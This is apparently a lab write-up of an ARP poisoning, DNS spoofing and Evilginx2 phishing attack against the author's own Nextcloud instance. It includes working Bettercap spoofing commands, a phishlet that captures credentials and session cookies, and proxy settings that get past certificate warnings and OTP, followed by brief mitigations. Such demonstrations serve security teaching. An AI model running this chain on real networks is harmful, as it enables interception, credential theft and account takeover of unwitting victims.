# ARP poisoning, DNS spoofing and phishing attack

## Introduction

In this demo, an **ARP poisoning** attack is performed to intercept network traffic between a victim and the gateway. The attacker then uses **DNS spoofing** to redirect the victim's web traffic to a malicious website, which is designed to look like a legitimate site. Finally, a **phishing attack** is carried out to steal the victim's credentials.

## Definitions

* **ARP Poisoning**
ARP poisoning is an attack in which a malicious actor sends forged ARP messages onto a local network, associating their own MAC address with the IP address of a legitimate host (such as the default gateway). This causes traffic intended for that host to be redirected to the attacker instead, enabling interception or manipulation of network communications.
* **DNS Spoofing**
DNS spoofing is an attack in which forged DNS responses are sent to a victim, resolving a legitimate domain name to a malicious IP address chosen by the attacker. This redirects the victim's traffic to a fraudulent server without their knowledge.
* **Attacker-in-the-Middle Proxy (Evil Proxy)**
An attacker-in-the-middle proxy is a server that sits between a victim and a legitimate website, forwarding requests and responses while intercepting sensitive data such as credentials and session cookies. An evil proxy fetches content from the real website in real time, making the fake site visually identical and functionally indistinguishable from the legitimate one. This also allows the attacker to bypass multi-factor authentication, since the victim unknowingly submits their one-time code through the proxy to the real site, which the attacker can then use immediately to hijack the session.

## Configuration

* **Threat model**:
  * The attacker is a malicious actor who has access to the same network as the victim. They can perform ARP poisoning to intercept traffic and DNS spoofing to redirect the victim's web traffic.
* **Tools**:
	* **Evilnginx2**: An attacker-in-the-middle proxy tailored for phishing attacks. It can be used to create a fake website that looks identical to the legitimate one, allowing the attacker to steal credentials.
  * **Bettercap**: A simple command line tool to perform ARP poisoning and DNS spoofing attacks.
  * **Nginx proxy manager**: A reverse proxy that allows evilnginx2 to receive certificates even when behind a NAT
  * **Nextcloud**: A self-hosted file sharing and collaboration platform that will be used as the legitimate website for the phishing attack.
  * **Docker**: A platform that allows the attacker to run the necessary tools in isolated containers, making it easier to manage dependencies and configurations.
  * **Tailscale**: A VPN service that allows to create a secure virtual network.
* **Machines**:
	* **Windows 11** :(IP: 192.168.11.118) it will be the victim that will be targeted by the ARP poisoning and DNS spoofing attacks.
  * **Kali Linux**: (IP:192.168.11.96) that will run Evilnginx2 and Nginx proxy manager in Docker containers.
  * **Raspberry Pi**: (IP:192.168.11.61) that will be used to perform the ARP poisoning attack using Bettercap.
  * **Ubuntu Server**: will serve the nextcloud instance that the attacker will impersonate for the phishing attack.

## Domain configuration

Because this is self-contained demo, I have used a domain I already own ```leobloomfield.eu``` managed by cloudflare. \
The records I have added are:
```kali.leobloomfield.eu A 100.64.1.216```
```fake.leobloomfield.eu CNAME kali.leobloomfield.eu```

![cloudflare](images/Screenshot%202026-06-01%20123016.png)

I also have records that point to the nextcloud instance, but they are not relevant for this demo.\
Then I also created **zone dns tokens** for the SSL certificate generation. It will later be used by nginx proxy manager to generate the certificate for the fake domain.\
It is relevant to notice that `kali.leobloomfield.eu` points to `100.64.1.216` not to the actual private IP of the Kali machine: `192.168.1.96`. Instead it points to the IP which **tailscale** has assigned to it. When I tried to use the private IP, the router's DNS service would not resolve the record, while Cloudflare or Google did. So I think it's a router mitigation that prevents to resolve private IPs, but doesn't apply to tailscale.
My setup always involved tailscale to mimic the effect of public IPs, but it is interesting that it won't work without it.

## ARP poisoning attack

The ARP poisoning attack is performed using **Bettercap** on the **Raspberry Pi**. I tried running bettercap on the Kali Linux machine, but it was not able to perform the attack successfully, probably because virtualization, while on the Raspberry Pi it worked without any issues. In practice, the evil proxy may not be on the same machine as the one performing the ARP poisoning attack, so this setup is still valid for the demonstration.\
First of all, I enabled **IP forwarding** on the Raspberry Pi to allow the traffic to be forwarded to the gateway after being intercepted. This is done by running the following command:

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

The command used to perform the ARP poisoning attack and DNS spoofing is:

```bash
sudo bettercap -iface eth0
 ```

and the subsequent commands are:

```bash
net.recon off
net.probe off
set arp.spoof.targets 192.168.11.118
set arp.spoof.fullduplex true
arp.spoof on
set dns.spoof.targets 192.168.11.118
set dns.spoof.domains nc.leobloomfield.eu
set dns.spoof.address 100.64.1.216
dns.spoof on
```
![bettercap](images/Screenshot%202026-06-01%20155037.png)

## Evilnginx2

Evilnginx2 is used to create a fake website that looks identical to the legitimate one, allowing the attacker to steal credentials. The fake website is hosted on the Kali Linux machine, and it is accessible through the domain ```fake.leobloomfield.eu```.\
The configuration of Evilnginx2 is done through a file, called **phishlet**, which specifies the domains to be spoofed and the credentials to be stolen. The configuration file is as follows:

```yaml
min_ver: '3.0.0'
proxy_hosts:
  - {phish_sub: 'fake', orig_sub: 'nc', domain: 'leobloomfield.eu', session: true, is_landing: true, auto_filter: true}
#sub_filters:
 # - {triggers_on: 'breakdev.org', orig_sub: 'academy', domain: 'breakdev.org', search: 'something_to_look_for', replace: 'replace_it_with_this', mimes: ['text/html']}
auth_tokens:
  - domain: 'nc.leobloomfield.eu'
    keys: ['.*:regexp']
    type: 'cookie'
credentials:
  username:
    key: 'user'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'
login:
  domain: 'nc.leobloomfield.eu'
  path: '/login'
auth_urls:
  - '/apps/dashboard/'
```

Evilnginx2 is inside a docker container.
The **Dockerfile** is as follows:

```Dockerfile
# Use Ubuntu 22.04 as the base image
FROM ubuntu:22.04

# Install only necessary dependencies
RUN apt-get update && \
    apt-get install -y --no-install-recommends \
    ca-certificates \
    && rm -rf /var/lib/apt/lists/*

# Create app directory
RUN mkdir -p /app

# Copy the Evilginx build to the /app/evilginx directory
COPY build/evilginx /app/evilginx

# Expose port 443
EXPOSE 443

# Define the mount points for phishlets and config folders
VOLUME ["/phishlets", "/root/.evilginx"]

# Define the command to run Evilginx with mounted folders
CMD ["/app/evilginx", "-p", "/phishlets", "-c", "/root/.evilginx", "-developer"]
```

and to run it:

```bash
# Stop and remove any existing container with the name evilginx-container
docker stop evilginx-container 2>/dev/null || true
docker rm evilginx-container 2>/dev/null || true

# Run the container interactively with a bash shell
docker run -it \
  --add-host="nc.leobloomfield.eu:100.64.1.14" \
  -p 4433:443 \
  -v $(pwd)/phishlets:/phishlets \
  -v ~/.evilginx:/root/.evilginx \
  --name evilginx-container \
  evilginx-image \
```

In the evilnginx2 console I set the configuration as:

```bash
config domain leobloomfield.eu
config ipv4 192.168.11.96
phishlets hostname nc leobloomfield.eu
phishlets enable nc
```

![evilnginx](images/Screenshot%202026-06-01%20122413.png)

This is hosted behind **Nginx proxy manager**, **npm**, which allows it to receive the traffic on port 443 and forward it to the container on port 4433.\
The configuration of **npm** is done through the web interface, where I added a new proxy host with the following settings:

* Domain names: `fake.leobloomfield.eu`
* Scheme: https
* Forward hostname / IP: `192.168.11.96`
* Forward port: `4433`

and in the SSL tab I enabled the SSL certificate, using the DNS challenge and the cloudflare token I created before.\
Lastly in the advanced settings I put:

```nginx
proxy_ssl_server_name on;
proxy_ssl_verify off;

proxy_set_header X-Real-IP $remote_addr;
proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
proxy_set_header X-Forwarded-Proto $scheme;

proxy_set_header Host fake.leobloomfield.eu;
proxy_ssl_name fake.leobloomfield.eu;
```

I also put a redirection host that when a host access the ip of kali machine but with the `nc.leobloomfield.eu` domain header, it redirects to the `fake.leobloomfield.eu`. I used there a self-signed certificate.

```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem \
-days 365 -nodes -subj "/CN=nc.leobloomfield.eu"
```

![proxy](images/Screenshot%202026-06-01%20122455.png)

![redirection](images/Screenshot%202026-06-01%20122513.png)

Now when the victim tries to access `nc.leobloomfield.eu`, it will be redirected to `fake.leobloomfield.eu`. The browser **will** show a warning, before the redirection, because my certificate for `nc.leobloomfield.eu` is self-signed, but if the victim ignores the warning and proceeds to the website, they will see a login page that looks identical to the legitimate one, with a valid certificate.\
![login](images/Screenshot%202026-06-02%20145928.png)
When the victim enters their credentials, they will be captured by Evilnginx2. If the victim has OTP enabled, the attacker can still impersonate the website and get the credentials, since evilnginx2 proxies in real time.\
![credentials](images/Screenshot%202026-06-02%20150023.png)
Finally, the cookies of the victim will be captured, allowing the attacker to impersonate the victim and access their account without needing the credentials.

## Mitigations

* **Use HTTPS**: don't ignore browser warnings about invalid certificates, and always use HTTPS to encrypt your traffic.
* **Look at the domain**: always check the domain of the website you are accessing, and make sure it is the legitimate one.
* **Public Wi-Fi**: avoid using public Wi-Fi networks, as they are often insecure and can be easily compromised by ARP poisoning. Use a VPN if you need to access the internet on a public Wi-Fi network.
* **Passkey on trusted devices**: create a passkey on a trusted device for your accounts to limit password exposure and also to verify that the passkey works

## Bibliography
[Claude](https://claude.ai)
[ChatGPT](https://chat.openai.com)
[Article explaining evilnginx2 in Docker](https://www.naunet.eu/blog/9-how-to-use-evilginx-3-with-custom-certificates)
[Evilnginx2 docs](https://help.evilginx.com/community)
[Docker docs](https://docs.docker.com/)
[Youtube video](https://www.youtube.com/watch?v=sZ22YulJwao&t=624s)